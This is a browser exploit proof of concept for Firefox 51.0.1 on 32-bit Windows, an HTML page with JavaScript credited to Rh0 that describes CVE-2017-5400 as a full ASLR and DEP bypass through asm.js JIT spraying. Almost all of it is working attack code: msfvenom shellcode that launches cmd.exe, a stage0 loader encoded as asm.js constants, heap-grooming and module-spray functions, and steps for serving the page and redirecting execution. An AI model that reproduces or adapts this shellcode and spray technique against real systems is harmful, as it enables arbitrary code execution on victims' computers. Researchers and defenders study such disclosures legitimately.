<!DOCTYPE HTML>

<!--

    BUG 1334933 (CVE-2017-5400)

    * FULL ASLR AND DEP BYPASS USING ASM.JS JIT SPRAY *

    Targeted (but unprecise) ASM.JS JIT-Spray 
    Circumvention of the mitigations introduced against bug 1325200

    WinExec("cmd.exe") PoC

    Tested against:

    *) Firefox Release 51.0.1 32-bit
       https://ftp.mozilla.org/pub/firefox/releases/51.0.1/win32/en-US/Firefox%20Setup%2051.0.1.exe

    running on Windows 10 64-bit (Version 1511)

    See Bug 1325200 for more information.

    Howto:
    1) serve PoC over network and open it in Firefox 51.0.1 
    2) set EIP to 0x55550055 (Firefox 51.0.1) in Debugger
    3) Continue execution. This should execute Winexec("cmd.exe")

    (C) Rh0 - Jul. 17, 2017

-->

<head>
<meta charset=UTF-8 />
<script>

// $ msfvenom --payload windows/exec CMD=cmd.exe EXITFUNC=seh
payload = '' +
	'\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b' +
	'\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7' +
	'\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf' +
	'\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c' +
	'\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01' +
	'\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31' +
	'\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d' +
	'\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66' +
	'\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0' +
	'\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f' +
	'\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00' +
	'\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xfe\x0e' +
	'\x32\xea\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a' +
	'\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53' +
	'\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00'

max_payload_sz = 516 // DO NOT CHANGE (hardcoded in stage0)
jmp_distance = 7
jmp = "eb"
// stage0 will load and execute payload
stage0 = [
	'07eb306a', '07eb905e', '07ebad64', '07eb0c6a', '07eb905b', 
	'07ebc301', '07eb038b', '07eb1c6a', '07eb905b', '07ebc301', 
	'07eb1b8b', '07eb006a', '07eb9050', '07ebc031', '07eb4db0', 
	'07eb4cb4', '07ebc931', '07eb4966', '07ebe1f7', '07eb2eb0', 
	'07eb44b4', '07ebc189', '07eb9058', '07eb9051', '07eb9050', 
	'07ebc031', '07eb34b0', '07eb32b4', '07ebc931', '07eb4966', 
	'07ebe1f7', '07eb45b0', '07eb4cb4', '07ebc189', '07eb9058', 
	'07eb9051', '07eb9050', '07ebc031', '07eb53b0', '07eb4eb4', 
	'07ebc931', '07eb4966', '07ebe1f7', '07eb4bb0', '07eb45b4', 
	'07ebc189', '07eb9058', '07eb9051', '07eb0e6a', '07eb9059', 
	'07ebe789', '07eb904f', '12eb086a', 'c5eb9090', '07eb9058', 
	'07ebd801', '12eb288b', 'd0eb9090', '07eb206a', '12eb9058', 
	'dbeb9090', '07ebd801', '12eb308b', 'dbeb9090', '07eb1b8b', 
	'07eb4947', '07eb61e3', '07ebc031', '07ebad66', '07eb613c', 
	'07eb147c', '07eb202c', '07eb073a', '07eba674', '07eb85eb', 
	'07eb006a', '07eb9050', '07ebc031', '07eb70b0', '07eb63b4', 
	'07ebc931', '07eb4966', '07ebe1f7', '07eb6cb0', '07eb6cb4', 
	'07ebc189', '07eb9058', '07eb9051', '07eb9050', '07ebc031', 
	'07eb6db0', '07eb41b4', '07ebc931', '07eb4966', '07ebe1f7', 
	'07eb75b0', '07eb61b4', '07ebc189', '07eb9058', '07eb9051', 
	'07eb9050', '07ebc031', '07eb73b0', '07eb74b4', '07ebc931', 
	'07eb4966', '07ebe1f7', '07eb56b0', '07eb69b4', '07ebc189', 
	'07eb9058', '07eb9051', '07ebeb89', '07eb3c6a', '07eb9058', 
	'07ebd801', '07eb008b', '07ebd801', '07eb786a', '07eb905d', 
	'07ebe801', '07eb008b', '07ebd801', '07ebc589', '07eb206a', 
	'07eb9058', '07ebe801', '07eb008b', '07ebd801', '07ebd231', 
	'07ebe789', '07eb0d6a', '12eb5059', 'dbeb9090', '07ebd001', 
	'07eb308b', '07ebde01', '07eba6f3', '07eb9058', '07eb35e3', 
	'07eb046a', '07eb905e', '07ebf201', '07eb90eb', '07eb246a', 
	'07eb9058', '07ebe801', '07eb008b', '07ebd801', '07ebead1', 
	'07ebd001', '07eb108b', '07ebc031', '07ebffb4', '07ebffb0', 
	'07ebd021', '07eb1c6a', '07eb905a', '07ebea01', '07eb128b', 
	'07ebda01', '07ebe0d1', '07ebe0d1', '07ebc201', '07eb128b', 
	'07ebda01', '07eb406a', '07ebdb31', '07eb30b7', '07eb9053', 
	'07eb10b7', '07eb9053', '07eb006a', '07ebd2ff', '07ebebd9', 
	'07eb0c6a', '07eb905e', '07ebe601', '07ebe389', '07eb33d9', 
	'07eb368b', '07ebdb31', '07ebdcb3', '07eb00b7', '07ebde01', 
	'07ebc789', '07ebc931', '07eb00b5', '07eb81b1', '07eb076a', 
	'07eba55b', '07ebde01', '07ebe9e2', '07ebe0ff', '9090008d'
]

asm_js_header = '' +
'function asm_js_module(stdlib, ffi, heap){' + 
'    "use asm";' +
'    var buf = new stdlib.Uint32Array(heap);' +
'    var ffi_func = ffi.func;' +
'    function payload_code(){' +
'    var val = 0;'

asm_js_footer = '' +
'    return val|0;' +
'    }' +
'    return payload_code;' +
'};' +
/* triggers creation of many RX modules */
'spray_modules();'


/* should trigger garbage collection */
function gc(){
    for (var i=0; i<=10; i++)
        var x = new ArrayBuffer(0x1000000)
}


function load_asmjs(){
    code = "val = ffi_func("
    constant_no = 0
    offset = 0x10

    /* nops */
    for (; constant_no < (0x80/4) - 1 ; constant_no++){
        code += '0xa9909090|0,\n'
    }

    code += '0x'+ jmp_distance.toString(16) + jmp + '9090|0,\n'

    /* 2-byte stage0 */
    for (i in stage0){
        code += '0x' + stage0[i] + "|0,\n"
    }

    if (payload.length > max_payload_sz){
        alert("Error: shellcode payload is too big")
        return
    }

    /* append binary payload (if any, in case stage0 loader is used) */
    for (var i=0; i < payload.length; i+=4){
        code += '0x'
        val = payload.slice(i, i + 4)
        /* only for last iteration */
        while (val.length < 4) val += "\x90"
        for (var j=3; j>=0; j--){
            code += (0x100 + val.charCodeAt(j)).toString(16).slice(1)
        }
        code += '|0,\n'
    }

    /* fill up payload space */
    if (payload.length > 0){
        for (var i=0; i < ((max_payload_sz - 4) - payload.length); i+=4){
            code += '0xcccccccc|0,\n'
        }
        code += '0xcccccccc|0)|0;\n'
    }
    else{
        /* FIXME */
        code += '0xcccccccc|0)|0;\n'
    }


    /* https://developer.mozilla.org/en-US/docs/Games/Techniques/Async_scripts
     */
    asm_js = asm_js_header + code + asm_js_footer
    //alert(asm_js)
    /* create blob script and load it */
    var blob = new Blob([asm_js]);
    var script = document.createElement('script');
    var url = URL.createObjectURL(blob);
    script.onload = script.onerror = function() { URL.revokeObjectURL(url); };
    script.src = url;
    /* triggers asm module compilation and spray_modules() execution */
    document.body.appendChild(script);
}


function spray_modules(){
    var heap = []
    var current_address = 0x08000000
    var end_address = 0x50000000
    var block_size = 0x1000000

    /* reserve large heap blocks to decrease possible 64KB addresses
       this only serves the purpose to get more deterministic VirtualAlloc
       allocations with asm.js modules later on */
    while(current_address < end_address){
        var heap_block = new Uint32Array(block_size/4 - 0x100)
        heap.push(heap_block)
        current_address += block_size
    }

    buffer = new ArrayBuffer(1 << 16)
    x = []

    /* this works only once for a process!
       spray max wasm allocations allowed, assuming that each module will be
       smaller than 64KB
     */
    for (var i=0;i<(159*1024*1024)/(64*1024);i++){ 
        x[i] = asm_js_module(window, {func: ffi}, buffer)
    }

    /* release large heap blocks */
    heap = ""
    gc()

    trigger_vuln()
}

/* used to pass many parameters in asm.js module */
function ffi(){ // foreignFunctionInterface
    var x = 0
    return x|0;
}


/* GET EIP CONTROL WITH YOUR VULN HERE */
/* SET EIP TO 0x55550055 ON WINDOWS 32-bit*/
function trigger_vuln(){
    /* You may need to adjust this address dependent on your vuln */
    jit_target_51_0_1 = 0x55550055
    msg = "Set EIP with your vulnerability (or with a debugger) to address "
    msg += '0x' + jit_target_51_0_1.toString(16) + " (Firefox 51.0.1)"
    alert(msg)
}


</script>
</head>
<html>
<body style=background:black onload=load_asmjs()>
<h2 style=color:green>
&#x03C1;
</h2>
</body>
</html>
